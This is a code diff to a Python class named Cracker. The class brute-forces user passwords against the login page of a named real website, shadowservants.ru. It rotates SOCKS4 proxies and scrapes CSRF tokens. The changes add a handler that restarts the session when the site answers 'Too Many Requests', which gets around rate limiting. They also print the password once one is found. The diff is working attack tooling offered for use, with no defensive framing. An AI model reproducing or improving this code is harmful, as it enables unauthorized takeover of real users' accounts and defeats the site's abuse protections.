@@ -27,7 +27,7 @@ class Cracker:
 
         try:
             r.proxies = {'https': 'socks4://' + self.proxy}
-            data = r.get('https://shadowservants.ru/login', timeout=5).text
+            data = r.get('https://shadowservants.ru/login', timeout=2).text
             reg = re.findall(r'<meta name=\"csrf_token\" content=\"[A-Za-z0-9.-]+\" />', data)
             if len(str(reg)) < 3:
                 if ThreadStatic.Done is True:
@@ -68,6 +68,9 @@ class Cracker:
                 repl = r.post(url='https://shadowservants.ru/login',
                               data={'login': self.login, 'password': password, 'csrf_token': csrf},
                               headers={"referer": "https://shadowservants.ru/login"}, timeout=5)
+                if "Too Many Requests" in repl.text:
+                    self.session_get()
+                    return
                 if "Неправильный логин или пароль" not in repl.text and "Пользователь неактивен" not in repl.text:
                     try:
                         os.mkdir('./workout/')
@@ -80,6 +83,8 @@ class Cracker:
                     except:
                         print('\nCan\'t save results. Ok, I just say it here.\n')
                     print("\n\nNicely done! Password for \"{}\" is \"{}\"".format(self.login, password))
+                    print(repl.text)
+                    print('Shutting down threads ...')
                     raise KeyboardInterrupt
                 else:
                     if ThreadStatic.Done is True:
